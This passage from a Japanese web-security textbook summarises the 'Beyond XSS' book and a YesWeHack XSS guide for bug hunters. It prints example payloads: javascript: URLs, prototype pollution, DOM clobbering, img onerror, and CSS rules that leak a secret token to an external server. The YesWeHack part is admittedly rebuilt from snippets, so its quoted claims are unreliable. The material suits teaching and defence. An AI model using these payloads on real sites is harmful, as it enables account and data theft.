- **日本語版と英語版の関係**: 本作業で両トップページ（序章）を突き合わせた結果、**日本語版と英語版のトップページの内容は同一**（日本語版は英語版の忠実な翻訳）であり、日本語版に欠落した章は存在しない。日本語版だけで全5章32本が読める完結した翻訳になっている（本セクションのタスク上「英語版で日本語版の欠落を補完」する必要はなかった）。

> 出典: このシリーズについて（The Origin of This Series） — https://aszx87410.github.io/beyond-xss/ja/

### 対象読者と前提知識

本書が想定する読者は **フロントエンドエンジニア、およびセキュリティに関心のある人**である。前提知識として、**フロントエンドとバックエンドの違いが分かること、HTML・CSS・JavaScriptの基本を理解していること**が求められる（＝ゼロからの入門書ではなく、開発経験者が「攻撃者視点」を獲得するための本）。

本教科書の読者（反射型の素朴なXSSは知っているが、より高度な領域を体系的に学びたい中〜上級者）にとって、Beyond XSS は理想的な骨格になる。本書は「反射型XSSの入口」から始めて、**DOM型XS・mutation XSS・Universal XSS といった高度なXSS**、さらに **JavaScriptを一切実行しない攻撃**、**クロスサイト攻撃**、**サイドチャネル攻撃**へと段階的に視野を広げていく構成になっているためである。

### 本書が扱う18の主要トピック（一覧）

序章で著者が明示している、本書全体を横断する18のキーワードを、初学者向けの一言解説とともに掲げる。これが「これから広がる惑星たち」の名前一覧である。

1. **XSS（Cross-Site Scripting）** — 攻撃者が被害者のブラウザ上で任意のJavaScriptを実行させる攻撃。
2. **CSP（Content Security Policy）** — 「このページで読み込み・実行してよいスクリプトの出所」をサーバーがブラウザに宣言し、XSSの被害を抑える防御機構。
3. **Sanitization（サニタイズ）** — 入力に含まれる危険な文字列やタグ・属性を、無害な形に変換・除去する処理。
4. **HTML injection** — スクリプトを走らせられなくても、攻撃者がHTMLタグを差し込めること自体が引き起こす害。
5. **CSS injection** — JavaScriptなしで、CSSだけを注入して情報を盗み出す攻撃。
6. **DOM clobbering** — HTML要素の `id`/`name` でJavaScriptの変数を「上書き」し、コードの挙動を乗っ取る技法。
7. **Prototype pollution（プロトタイプ汚染）** — JavaScriptの継承の仕組み（プロトタイプチェーン）を汚染し、全オブジェクトの既定値を書き換える攻撃。
8. **CSRF（Cross-Site Request Forgery）** — 被害者のログイン状態を悪用し、本人の意図しないリクエストを別サイトから送らせる攻撃。
9. **CORS（Cross-Origin Resource Sharing）** — 異なるオリジン間でのデータ取得を「例外的に許可」する仕組み。設定を誤ると情報漏えいの穴になる。
10. **Cookie tossing（クッキー・トッシング）** — サブドメインなどから、上位サイトへ狙ったCookieを「投げ込む」攻撃。
11. **Cookie bomb** — 巨大／大量のCookieを仕込み、リクエストヘッダを肥大化させてサイトを機能不全（DoS）にする攻撃。
12. **Clickjacking（クリックジャッキング）** — 透明化したiframeを重ね、ユーザーに意図しないクリックをさせる攻撃。
13. **MIME sniffing** — ブラウザがコンテンツの種類（MIMEタイプ）を自動推測する挙動を悪用する攻撃。
14. **XSLeaks（Cross-Site Leaks）** — 応答時間や副次的な挙動の差から、他サイトの情報を「間接的に」推測するサイドチャネル攻撃。
15. **CSTI（Client-Side Template Injection）** — AngularやVueなどのフロントエンドテンプレート機能に式を注入し、コードを実行させる攻撃。
16. **Subdomain takeover（サブドメイン乗っ取り）** — 放置され宙に浮いたサブドメインのDNS設定を攻撃者が奪い、正規ドメインの一部になりすます攻撃。
17. **Dangling markup injection** — 閉じられていない属性やタグを使い、後続のHTML（トークンなど）を攻撃者サーバーへ送らせる、JSに頼らない情報窃取。
18. **Supply chain attack（サプライチェーン攻撃）** — npmパッケージやCDNなど「上流」を汚染し、それを使う多数の「下流」サイトを一挙に侵害する攻撃。

> 出典: このシリーズについて（トピック一覧） — https://aszx87410.github.io/beyond-xss/ja/

---

### 全体像：5章32セクションの地図

ここからが本セクションの中核である。5つの章それぞれについて、**章の狙い**と、**含まれる各記事のタイトル＋その要点（何を・なぜ扱うか、可能な範囲で仕組みまで）**を示す。反射型XSSしか知らない読者は、この地図を頭に入れておくと、以降の各深掘りセクションが全体のどこに位置するのかを常に把握できる。

#### 第1章：XSSから見たフロントエンド・セキュリティ（本章＝基礎）

XSSと、その土台となるブラウザのセキュリティモデルを扱う導入章。「XSSとは何か」を、単なる `alert(1)` を超えて正確に定義し直す。

- **ブラウザのセキュリティモデル**（`ch1/browser-security-model`）— なぜXSSがそもそも「危険」なのか。ブラウザは複数サイトのコードを同時に動かす実行環境であり、**同一オリジンポリシー（Same-Origin Policy: あるオリジンのページから、別オリジンのデータへ勝手にアクセスさせない基本ルール）**によって各サイトを隔離している。XSSが恐ろしいのは、この隔離の内側（＝標的サイトのオリジン）で攻撃者コードが動くため、Cookie・DOM・セッションといった資産に正規スクリプトと同じ資格でアクセスできてしまうからだ、という原理を押さえる。
- **XSSから始めるフロントエンドのセキュリティ**（`ch1/xss-introduction`）— XSSの分類（反射型／格納型（stored：入力がサーバーに保存され、他ユーザーの閲覧時に発火）／DOM型（DOM-based：サーバーを経由せず、クライアント側JSが危険な代入先へ入力を渡すことで発火））と、**sink（シンク：ユーザー入力が最終的に実行・解釈される危険な代入先。代表例が `innerHTML` や `document.write`、`eval`）**という概念を導入する。
- **XSSについてもう少し詳しく**（`ch1/know-xss-a-bit-more`）— 単純なフィルタでは防ぎきれない多様なXSSベクタ（イベントハンドラ属性、各種タグ、エンコーディングの悪用など）を掘り下げ、「危険な文字を消せば安全」という素朴な発想が崩れることを示す。
- **危険な `javascript:` 疑似スキーム**（`ch1/javascript-protocol`）— URLとして書けるのにJavaScriptを実行してしまう `javascript:` スキームの解説。現代フロントエンドで特に注意すべき落とし穴。原著の実例:

  ```html
  <a href="javascript:alert(1)">Link</a>
  <iframe src="javascript:alert(1)"></iframe>
  <form action="javascript:alert(1)">
    <button>submit</button>
  </form>
  <form id="f2"></form>
  <button form="f2" formaction="javascript:alert(2)">submit</button>
  ```

  なぜ動くのか: `href`・`src`・`action`・`formaction` など「URLを取る属性」にブラウザが `javascript:` を与えられると、そのURLへ遷移する代わりに続きのコードをJavaScriptとして実行する。特に `<iframe src="javascript:...">` は**クリックなどのユーザー操作なしで自動発火**する点が危険で、`href` 由来のリンクにユーザー入力を差し込む実装（例: `<a href="{{userInput}}">`）はここが穴になる。

> 出典: 第一章 各記事（ブラウザのセキュリティモデル／XSS入門／危険な javascript: 疑似スキーム） — https://aszx87410.github.io/beyond-xss/ja/ch1/browser-security-model/ ほか

#### 第2章：XSSの防御と回避

XSSを「どう防ぐか」と、その防御を攻撃者が「どう回避するか」を表裏一体で扱う章。**防御は単一の手段ではなく多層で成り立つ**という本書全体の思想が最も鮮明に出る。

- **XSSの第一の防御線：サニタイズ**（`ch2/xss-defense-sanitization`）— 入力／出力から危険なHTMLを除去する。定番ライブラリ **DOMPurify** の使い方と、「自前の正規表現サニタイズがなぜ破られるか」を扱う。
- **XSSの第二の防御線：CSP**（`ch2/xss-defense-csp`）— 万一XSSが入り込んでも、CSP（実行してよいスクリプトの出所をサーバーが許可リストで宣言する仕組み）で被害を抑える。`nonce`（サーバーが毎回発行するランダム値。一致するスクリプトだけ実行を許す）や `strict-dynamic` などの考え方を導入。
- **XSSの第三の防御線：影響範囲の縮小**（`ch2/token-storage`）— 認証トークンをどこに保存するか（localStorage か HttpOnly Cookie か）で、XSS発生時の被害の大きさが変わる。**HttpOnly Cookie（JavaScriptから読み取れないCookie）**にすればトークン窃取を封じられる、という「被害の最小化」の発想。
- **最新のXSS防御：Trusted Types と組み込み Sanitizer API**（`ch2/trust-types`）— **Trusted Types**（`innerHTML` などの危険なsinkに、検証済みの「信頼された型」の値しか渡せなくするブラウザ機構。DOM型XSSを構造的に潰す）と、ブラウザ標準の **Sanitizer API（`setHTML()` など）**を解説。これらは近年ブラウザに実装・標準化が進んでいる新しい防御であり、仕様が更新されうる領域なので、採用時は最新の対応状況を確認すること。
- **防御の回避：一般的なCSPバイパス**（`ch2/csp-bypass`）— CSPは「許可リストの評価」で成り立つため、**許可リスト自体に緩い出所が含まれていると破られる**。典型例は、許可ドメイン上にある **JSONPエンドポイント**（コールバック名にJSを書けるАPI）や、`base-uri` 未指定による `<base>` タグ悪用、`unsafe-inline`／過度に広いホスト許可など。CSPは「何を許可したか」で強さが決まることを、回避の側から学ぶ。
- **防御の回避：Mutation XSS（mXSS）**（`ch2/mutation-xss`）— サニタイザが「安全」と判定したHTMLでも、**ブラウザのHTMLパーサがDOMに挿入する際に文字列を再解釈（mutate）して**危険な形に化けることがある。名前空間（HTML／SVG／MathMLでタグの解釈規則が切り替わる）の混同を突く手口が代表例。**バージョン依存の重要例**として、DOMPurifyはこの種のmXSSバイパスを繰り返し修正しており、たとえば Michał Bentkowski が報告した名前空間混同によるバイパスは **DOMPurify 2.0.17（2020年）** で修正された。この手のバイパスは修正・再発を繰り返すため、利用中のDOMPurifyのバージョンと既知バイパスの対応状況を常に確認する必要がある（正確な対象バージョンと修正履歴は本記事および各CVE/アドバイザリを参照）。
- **最強のXSS：Universal XSS（UXSS）**（`ch2/universal-xss`）— 通常のXSSが「脆弱なそのサイト1つ」に閉じるのに対し、**UXSSはブラウザやブラウザ拡張自体の脆弱性**を突き、同一オリジンポリシーを無力化して**任意のサイト**でスクリプトを実行できてしまう、最も影響の大きいXSS。

> 出典: 第二章 各記事（サニタイズ／CSP／Trusted Types／CSPバイパス／Mutation XSS／Universal XSS） — https://aszx87410.github.io/beyond-xss/ja/ch2/xss-defense-sanitization/ ほか

#### 第3章：JavaScriptを使わない攻撃

本書で最も「常識が覆る」章。**攻撃＝JavaScript実行、という前提を捨てさせる**のが狙い。JSが1行も実行できなくても、HTML・CSS・JSの言語仕様そのものを悪用して情報を盗み、挙動を乗っ取れることを示す。

- **攻撃にJavaScriptを直接実行する必要があるなんて誰が言った？**（`ch3/attack-without-js`）— 章の導入。「JS実行を封じれば安全」という思い込みを崩す。
- **プロトタイプチェーンを悪用した攻撃：Prototype Pollution**（`ch3/prototype-pollution`）— JavaScriptの継承機構そのものを汚染する攻撃。**プロトタイプチェーン（あるオブジェクトにプロパティが無いとき、`__proto__` が指す「次の階層」を順にたどって探す仕組み）**を突く。原著の核心例:

  ```js
  var obj = {};
  obj.__proto__.x = 123;   // Object.prototype を汚染
  console.log(({}).x);     // => 123（無関係な空オブジェクトにも x が生える）
  ```

  なぜ動くのか: ほぼ全オブジェクトの `__proto__` は最終的に **`Object.prototype`** を指す共有の親である。そこに `x` を書き込むと、以後 `{}.x` を参照したエンジンは自オブジェクトに `x` が無いためチェーンを上って `Object.prototype.x` を見つけ、`123` を返す。**汚染は1回で全オブジェクトに波及する**のが恐ろしさの本質。現実には、クエリ文字列やJSONを再帰的にオブジェクトへマージする実装が入口になる:

  ```js
  // "?__proto__[a]=3" のような入力を素朴にパース／マージすると…
  var qs = parseQs("__proto__[a]=3"); // obj.__proto__.a を書き換えてしまう
  JSON.parse('{"__proto__": {"a": 1}}');
  ```

- **HTMLもJavaScriptに影響を与える？DOM clobbering入門**（`ch3/dom-clobbering`）— JSを注入できなくても、**HTML要素の `id`/`name` が同名のグローバル変数として見えてしまう**ブラウザ仕様（named access）を悪用し、JSの分岐や値を乗っ取る。原著の実例（サニタイズでJSは全て除去されるがHTMLタグは通る掲示板を想定）:

  ```html
  <div id="TEST_MODE"></div>
  <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
  <script>
    if (window.TEST_MODE) {                 // ← trueになる
      var script = document.createElement('script')
      script.src = window.TEST_SCRIPT_SRC   // ← "my_evil_script" になる
      document.body.appendChild(script)
    }
  </script>
  ```

  なぜ動くのか: `id="TEST_MODE"` の要素があると `window.TEST_MODE` がその要素を指すため `if` が真になる。さらに `<a>`（と `<base>`）は**文字列化すると `href` のURLを返す**特別な仕様を持つため、`window.TEST_SCRIPT_SRC + ''` が攻撃者の指定URLになり、悪性スクリプトが読み込まれる。JSを1バイトも書かずにスクリプト読み込みへ持ち込める点が要諦。
- **フロントエンドのテンプレートインジェクション攻撃：CSTI**（`ch3/csti`）— Angular等のクライアントサイド・テンプレート（`{{ }}` などで式を評価する仕組み）に式を注入し、サンドボックスを抜けてコード実行につなげる攻撃。
- **CSSだけで攻撃できる？CSSインジェクション（前編・後編）**（`ch3/css-injection` / `css-injection-2`）— JSなし・CSSのみで、ページ上の秘密情報（CSRFトークンなど）を1文字ずつ外部へ盗み出す。原著の核心例:

  ```css
  input[name="secret"][value^="a"] { background: url(https://myserver.com?q=a) }
  input[name="secret"][value^="b"] { background: url(https://myserver.com?q=b) }
  /* …c〜z まで続く… */
  input[name="secret"][value^="z"] { background: url(https://myserver.com?q=z) }
  ```

  なぜ動くのか: 属性セレクタ `[value^="a"]`（前方一致：値が `a` で始まる要素にマッチ）が当たった要素だけ `background` の `url(...)` が読み込まれ、攻撃者サーバーへHTTPリクエストが飛ぶ。どの文字宛にリクエストが来たかで**秘密値の先頭1文字が判明**する。これを繰り返す（判明した文字を前提に次の1文字を試す）ことで、CSSだけで値全体を1文字ずつ復元できる。後編ではフォントやインポートを使った高速化・改良版を扱う。
- **HTMLだけで攻撃できる？**（`ch3/html-attack`）— タグも属性もほとんど使えない極限状況でも、**dangling markup injection**（閉じられていない属性で後続HTMLを丸ごと攻撃者サーバーに送らせる）など、HTMLのみで成立する情報窃取を扱う。

> 出典: 第三章 各記事（Prototype Pollution／DOM clobbering／CSTI／CSS Injection 前後編／HTMLだけの攻撃） — https://aszx87410.github.io/beyond-xss/ja/ch3/prototype-pollution/ ほか

#### 第4章：クロスサイト攻撃（サイトの境界を越える）

「あるサイトから別サイトのユーザー／データを攻撃する」ための、境界（オリジン・サイト）の仕組みとその破り方を扱う章。ここを理解すると、CORSやCookieの設定ミスがなぜ致命傷になるかが腑に落ちる。

- **最重要：同一オリジンポリシーとサイト**（`ch4/sop-and-site`）— **オリジン（scheme＋host＋portの3点セット）**と**サイト（eTLD+1：例 `example.com` 単位。サブドメインを跨いだ広めの単位）**の違いを厳密に区別する。後続すべての土台になる最重要回。
- **CORS 基本紹介**（`ch4/cors-intro`）— 異なるオリジンへのアクセスを例外的に許可する仕組み。`Access-Control-Allow-Origin`（ACAO）などのレスポンスヘッダの意味を解説。
- **クロスオリジンセキュリティの問題**（`ch4/cors-attack`）— **CORSの設定ミスが情報漏えいになる原理**。たとえばサーバーがリクエストの `Origin` をそのまま `Access-Control-Allow-Origin` に反射し、かつ `Access-Control-Allow-Credentials: true`（Cookie付きリクエストを許可）を返すと、**任意の攻撃者サイトから被害者のCookie付きで機密APIを読める**。「許可の設定を動的に決める」実装が地雷になる。
- **CSRF を簡単に理解する**（`ch4/csrf`）— ブラウザがCookieをリクエストにフルオートでつけるためにCSRFが成立する原理と、トークン方式などの基本対策。
- **Same-site Cookie、CSRFの救世主？**（`ch4/same-site-cookie`）— **SameSite属性（Cookieをクロスサイトのリクエストに付けるかを制御。`Lax`／`Strict`／`None`）**がCSRFをどこまで防ぐか、そして防ぎきれない隙。**「単一点の防御ではなく多層防御」**という本書の主張が具体化する回。
- **Same-Siteからメインサイトへ**（`ch4/subdomain`）— サブドメインを攻撃拠点にして本体（メインサイト）を攻める。**Subdomain takeover（放置サブドメインのDNSを乗っ取る）**や **Cookie tossing（サブドメインから上位ドメインへCookieを投げ込み、本体の挙動を狂わせる）**を扱う。SameSiteは「サイト」単位の防御なので、同一サイト内のサブドメインが陥落すると防御が効かない、という弱点が浮かび上がる。
- **面白くて実用的な Cookie Bomb**（`ch4/cookie-bomb`）— 大量／巨大なCookieを被害者ブラウザに仕込み、以後のリクエストのCookieヘッダが上限を超えてサーバーに拒否される（＝そのユーザーだけサイトが開けなくなる）**クライアントサイドDoS**。

> 出典: 第四章 各記事（同一オリジンポリシーとサイト／CORS／CSRF／SameSite Cookie／サブドメイン／Cookie Bomb） — https://aszx87410.github.io/beyond-xss/ja/ch4/sop-and-site/ ほか

#### 第5章：その他の興味深いフロントエンド・セキュリティのトピック

これまでの枠に収まらない、応用・発展トピックを集めた章。著者が「個人的に最も好き」と語るXSLeaksもここ。

- **あなたの画面はあなたの画面ではない：クリックジャッキング**（`ch5/clickjacking`）— 標的サイトを**透明化したiframe**で重ね、ユーザーには無害なボタンに見せて実際は標的サイト上の危険な操作をクリックさせる。`X-Frame-Options`／CSP `frame-ancestors` による防御も扱う。
- **MIMEスニッフィングを利用した攻撃**（`ch5/mime-sniffing`）— ブラウザが `Content-Type` を無視して中身から種類を推測する挙動を悪用し、画像等として上げたファイルをHTML／スクリプトとして実行させる。`X-Content-Type-Options: nosniff` の重要性。
- **フロントエンドサプライチェーン攻撃：上流から下流への攻撃**（`ch5/supply-chain-attack`）— npmパッケージやCDNスクリプト、サードパーティ埋め込みなど「上流」を汚染し、それを読み込む無数の「下流」サイトを一挙に侵害する。**SRI（Subresource Integrity：読み込む外部リソースのハッシュを固定し、改ざんされたら実行しない仕組み）**などの対策。
- **Web3におけるウェブフロントエンド攻撃の応用**（`ch5/web3-attacks`）— ウォレット接続やトランザクション署名を扱うWeb3フロントエンド特有の、従来型フロントエンド攻撃の応用。
- **最も興味深いフロントエンドサイドチャネル攻撃：XSLeaks（パート1・2）**（`ch5/xsleaks-1` / `xsleaks-2`）— 直接データを読めなくても、**応答時間・エラーの有無・フレーム数・キャッシュ挙動などの「副作用の差」から他サイトの秘密をyes/noで推測する**サイドチャネル攻撃（オラクル攻撃）。同一オリジンポリシーを正面突破せずに情報を漏らす、フロントエンドセキュリティの最先端トピック。

> 出典: 第五章 各記事（クリックジャッキング／MIMEスニッフィング／サプライチェーン攻撃／Web3／XSLeaks 前後編） — https://aszx87410.github.io/beyond-xss/ja/ch5/clickjacking/ ほか

---

### 本書を貫く重要な結論（著者の主張）

まとめ（Conclusion）で著者が述べている、本書全体の思想的な結論を押さえておくと、個々の技術がなぜ重要かがぶれずに理解できる。

- **「知らないこと」こそが最大の脆弱性である。** 開発者は、あるコードの書き方が危険だと**知らない**がゆえに、無自覚に脆弱性を埋め込む。プロトタイプ汚染はセキュリティ界では常識なのに、フロントエンド学習中に誰も教えてくれなかった——この非対称を埋め、セキュリティ知識をフロントエンドコミュニティに還元することが本書の使命だと著者は語る。
- **防御は単一点ではなく多層（layered defense）で考える。** サニタイズ・CSP・トークン保存場所・SameSite Cookie など、各手段は単独では破られうる。組み合わせて初めて実用的な安全性が得られる、という考え方が全章に通底する。
- **フロントエンドセキュリティは「影響が小さい」と見られがちだが、それでも学ぶ価値がある。** 著者は正直に、XSSは1ユーザーが標的でアクセスできるデータも限定的なことがあり、サーバー側のSQLインジェクション（数百万件のハッシュ化パスワードを一挙に抜ける等）に比べれば影響は小さい場合がある、と認める。しかしそれが本書の情熱を損なうことはない、と続ける。
- **開発とセキュリティは表裏一体。** 開発はプロジェクト全体の構造を、セキュリティは各部品の細部を教えてくれる。両方を持つエンジニアはより安全なソフトウェアを書ける。「情報セキュリティはエンジニアの基礎スキルの一部」というのが著者の立場である。
- **実践の勧め。** 手を動かして学ぶなら **PortSwigger の Web Security Academy**（無料の実習ラボ群）が推奨されている。
- **最新情報の追い方。** 著者は、フォローすべきフロントエンドセキュリティの専門家として次を挙げている（順不同、専門は各人異なる）: **@kinugawamasato**（Kinugawa Masato。JS操作・フロントエンド脆弱性に精通、TeamsのRCEを発見）、**@terjanq**（Google、XS-Leaks Wikiを維持）、**@brutelogic**（XSSの達人）、**@albinowax**（PortSwigger主任研究者、毎年新Web攻撃技術を発表）、**@garethheyes**（PortSwigger、ブラウザ由来のフロントエンド脆弱性多数）、**@filedescriptor**（Cookie tossing/bombで言及）、**@SecurityMB**（Michał Bentkowski。GmailのDOM Clobberingやmutation XSSによるDOMPurifyバイパスで著名、現Google）ほか（@lbherrera_、@RenwaX23、@po6ix、@Black2Fan、@shhnjk、@cgvwzq、@S1r1u5_ など）。
- **オリジナリティの明示。** 本書で扱う技法は著者独自の発見ではなく、上記の専門家や広範なネット上の研究の整理・解説であり、可能な限り原典と発見者をクレジットしている、と著者は明言している。本教科書が二次・三次利用する際も、この出典尊重の姿勢を引き継ぐべきである。

> 出典: まとめ（Conclusion） — https://aszx87410.github.io/beyond-xss/ja/summary/

### この教科書における位置づけ

本セクションは、Beyond XSS という無料オンライン書籍の**「地図（インデックス）」**にあたる。反射型の素朴なXSSしか知らなかった読者は、これで(1) フロントエンドセキュリティがXSS以外にも広がる「宇宙」であること、(2) その宇宙が **XSSの基礎 → XSSの防御と回避 → JSを使わない攻撃 → クロスサイト攻撃 → サイドチャネル等の発展**という5層で整理できること、(3) 各層に具体的にどんな攻撃の「惑星」があり、その核心の仕組みは何か、を俯瞰できたはずである。以降の各セクションでは、この地図上の一つひとつの惑星（mutation XSS、prototype pollution、CSS injection、CORS設定ミス、XSLeaks など）に着陸し、原理・実際のペイロード・バージョン依存の注意点・防御策を深掘りしていく。

---

## YesWeHack XSS徹底ガイド

この節は、バグバウンティ（企業が脆弱性の報告に報奨金を払う制度）プラットフォーム YesWeHack が公開している総合ガイド *「XSS attacks & exploitation: The ultimate guide to cross-site scripting」* を典拠に、XSS（Cross-Site Scripting、クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）を「攻撃者・ハンター（脆弱性を探す人）の視点」で体系化します。前節までの PortSwigger（防御・分類の教科書的解説）や OWASP（防御策の標準）と異なり、この資料の主張の中心は一貫して次の一点にあります。

> **「XSS は `alert(1)` を出して終わりではない。脆弱性を見つけたら、その影響を最大化するために時間を投資し、被害者のアカウントから価値あるデータを奪う『専用の JavaScript マルウェア』まで作り込め」**

つまりこの節は、「XSS をどう見つけるか」だけでなく「見つけた XSS をどこまで悪用（exploit）できるか＝どうやってバグバウンティの報奨を最大化するか」に踏み込む、実戦寄りの内容です。読者は反射型の素朴な XSS を知っている前提なので、分類の暗記ではなく **「なぜブラウザが攻撃者の文字列をコードとして再解釈してしまうのか」という仕組みのレベル**まで掘り下げます。

> ⚠️ **未取得の資料**: 「XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack）」は自動取得できませんでした（理由: 執筆環境のネットワーク下り〔egress〕プロキシが `www.yeswehack.com` への直接アクセス、および Wayback Machine・各種リーダープロキシ・`yeswehack.github.io` へのアクセスをブロックしたため、WebFetch でページ本文を直接取得できなかった）。以下のURLからユーザーご自身で直接ご覧ください: https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

**（以下は取得できなかった資料の補足として、一般的な知識に基づく解説です。ただし完全な創作ではなく、Web 検索で復元した当該ガイド本文のスニペット・章立て・具体的な主張と、直接取得できた一次資料〔YesWeHack の xsstools リポジトリ・cure53/DOMPurify の公式 Wiki など〕、および著者の専門知識を統合して再構成しています。原典の最新版で細部〔例文の値やバージョン記述〕が更新されている可能性があるため、正確な最新の記述は上記URLでご確認ください。）**

---

### XSSとは何か — バグハンター視点の定義

YesWeHack のガイドは XSS を、**CWE-79（Improper Neutralization of Input During Web Page Generation＝Web ページ生成時の入力の不適切な無害化）に分類される、Web アプリケーションの脆弱性クラス**として定義します。攻撃者が悪意ある JavaScript を、ユーザーに配信されるコンテンツの中に注入（inject）できてしまう問題であり、アプリケーションがユーザー入力を適切に検証（validate）またはエスケープ（escape＝特殊文字を無害な表現に置換）しないときに発生します。

この脆弱性が本質的に危険な理由は、**ブラウザが「注入されたコード」と「サイト本来のコード」を区別できない**点にあります。いったんページ内で実行された攻撃者の JavaScript は、そのサイトのオリジン（scheme＋host＋port の組）が持つ全権限で動きます。すなわちサイトの Cookie・進行中のセッション・DOM（Document Object Model＝ページを木構造で表したブラウザ内オブジェクト）に、正規スクリプトと同じ信頼で触れられます。ガイドはこれを端的に「XSS は被害者のブラウザに悪意ある JavaScript を感染させ、被害者のデータを奪ったり、アカウントを完全に乗っ取ったりするために使われる、極めてありふれた脆弱性だ」と表現します。

#### なぜ動くのか（原理）

原理はブラウザの **HTML パーサ（parser＝受け取った HTML 文字列を上から解析して DOM 木に変換する処理系）の挙動**にあります。パーサは文字列の「出所」を見ません。**構文（syntax）だけを見て解釈**します。したがって、ユーザー入力が応答 HTML に無害化されないまま出力され、それがパーサによって「単なるデータ」ではなく「マークアップ／実行すべきコード」として再解釈されると、XSS が成立します。この「データとして意図された文字列がコードとして再解釈される（context confusion＝文脈の取り違え）」という現象が、あらゆる XSS の共通メカニズムです。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### XSSの類型 — 反射型・格納型・DOMベース・ブラインド・自己XSS

ガイドは XSS を「悪意あるスクリプトが**どの経路で**被害者のブラウザに届くか」で分類し、古典的な3類型（反射型・格納型・DOMベース）に加え、ハンターにとって重要な**ブラインドXSS**と**自己XSS**を取り上げます。

#### 反射型 XSS（Reflected XSS）

反射型は、**悪意あるユーザー入力がリクエストのプロパティ（URL パス、フラグメント〔`#` 以降〕、クエリ／ボディパラメータ、HTTP ヘッダなど）を通じて注入され、適切な無害化を経ずにその場でユーザーへ反射して返される**ときに発生します。サーバは入力を処理し、何のエンコードもせずに HTTP 応答に含めてしまうため、被害者が細工されたリンクを踏むと、そのブラウザで攻撃者のスクリプトが実行されます。

ペイロードはどこにも保存されないので、攻撃には**配信ステップ**が必要です。攻撃者は悪意あるリンクを作り、被害者にクリックさせます。

```
https://example.com/search?q=<script>alert(document.domain)</script>
```

> なぜ動くのか: `q` パラメータの値が検索結果ページの HTML ボディにそのまま埋め込まれ、パーサが `<script>` を「実行すべきスクリプト要素」として解釈するため。`document.domain` を出すのは、どのオリジンで実行されているかを証明し「単なる `alert(1)` 以上の実証」にするため。

#### 格納型 XSS（Stored XSS）

格納型は、注入されたスクリプトが**標的サーバに永続的に保存される**（データベース、掲示板、訪問者ログ、コメント欄など）タイプです。被害者が保存済みの情報を要求したときに、そのスクリプトがサーバから配信され実行されます。反射型と違い**被害者に特定のリンクを踏ませる必要がない**ため、一つのペイロードで複数の被害者に影響し得る点で特に危険だとガイドは強調します。

#### DOMベース XSS（DOM-based XSS）

DOMベースは、**安全でないクライアント側 JavaScript が、ユーザーが制御可能なデータ（DOMソース）を処理し、それを危険な代入先（DOMシンク）に渡す**ときに発生します。ガイドが繰り返し強調する最重要ポイントは次です。

> **DOMベース XSS のペイロードは「サーバに一度も到達しない」。攻撃チェーン全体がブラウザ内で完結するため、サーバ側のロギング・WAF（Web Application Firewall＝Web 用の防御装置）・バックエンド監視はこの攻撃を一切観測できない（blind）。**

これは、JavaScript を実行しない自動スキャナが DOMベース XSS を見逃しやすい理由でもあり、逆にハンターにとっては「サーバ側 WAF に阻まれずに刺さる」旨味のある攻撃面です。

**ソース（source）**とは、攻撃者が制御できるデータの入口です。代表例:

- `location.search`（`?` 以降のクエリ文字列）、`location.hash`（`#` 以降のフラグメント）、`location.href`
- `document.referrer`（遷移元 URL）
- `window.name`
- `document.cookie`
- `localStorage` / `sessionStorage`
- `postMessage` で受け取ったデータ
- WebSocket の `onmessage` データ

**シンク（sink）**とは、渡された文字列を「実行・レンダリング」してしまう危険な関数・プロパティです。代表例:

- `eval()`、`Function()`、`setTimeout()`/`setInterval()` に文字列を渡す形
- `document.body.innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write()`
- `element.setAttribute()` で `href`/`src`/`on*` を設定、`location`/`location.href` への代入

典型的な脆弱コードとペイロード:

```javascript
// 脆弱なコード（フラグメントを innerHTML に流し込む）
document.getElementById('out').innerHTML = location.hash.slice(1);
```
```
https://example.com/page#<img src=x onerror=alert(1)>
```

> なぜ動くのか: `location.hash`（ソース）で受け取った攻撃者制御文字列を `innerHTML`（シンク）に代入すると、ブラウザがその文字列を HTML として再パースする。`<img>` の読み込みは `src=x` で必ず失敗し、その失敗時に `onerror` ハンドラが発火して JavaScript が実行される。`<script>` タグは `innerHTML` 代入では実行されない（HTML 仕様の制約）ため、`onerror` のようなイベントハンドラ経由を使うのが定石。

#### ブラインド XSS（Blind XSS）

ブラインド XSS は、注入したスクリプトが**攻撃者自身のブラウザでは即座に実行されず、後から、別のコンテキストで発火する**格納型 XSS の一種です。典型は、問い合わせフォームやユーザーエージェント（User-Agent ヘッダ）に仕込んだペイロードが、後で**管理者だけが見る内部管理画面**でレンダリングされて発火するケースです。

ガイドはブラインド XSS の影響について重要な指摘をします。

> **ブラインド XSS の影響は、通常「高い権限を持つ被害者（管理者など）」を感染させる事実によって著しく増幅される。彼らはアプリケーションの制限区域にアクセスできるからだ。**

攻撃者はペイロードが「いつ・どこで」発火したか分からないため、実務では XSS Hunter のような**アウトオブバンド（out-of-band＝別チャネル）で発火を通知するコールバック型ペイロード**を使います。例えば、発火時に攻撃者サーバへ現在の URL・Cookie・DOM のスクリーンショットを送るスクリプトを注入しておきます。

#### 自己 XSS（Self-XSS）

自己 XSS は、**攻撃者が自分自身のブラウザにしか JavaScript を注入できない**タイプです（例: 自分のプロフィール欄に入れた値が自分のページでだけ実行される）。それ単体では他人を害せないため、多くのプログラムで低評価・対象外とされます。しかしガイドが説くのは**エスカレーション（escalation＝影響の格上げ）**の発想です。自己 XSS を **CSRF（Cross-Site Request Forgery＝クロスサイトリクエストフォージェリ、被害者に意図しないリクエストを送らせる攻撃）と連鎖**させ、「被害者のアカウントに攻撃者のペイロードを書き込ませてから発火させる」ことで、通常の（他者に効く）XSS 相当まで影響を引き上げられます。

> 出典: XSS attacks & exploitation: The ultimate guide to cross-site scripting（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide

---

### 注入コンテキストを見極める

ガイドが実戦の土台として重視するのが**注入コンテキスト（injection context＝あなたの入力が最終的に HTML／JS のどの構文位置に落ちるか）**の特定です。「どんな万能ペイロードを撃つか」ではなく、「**自分の入力が今どの文脈に入っているか**」を先に確定させることが、正しいペイロードを選ぶ唯一の方法だと説きます。

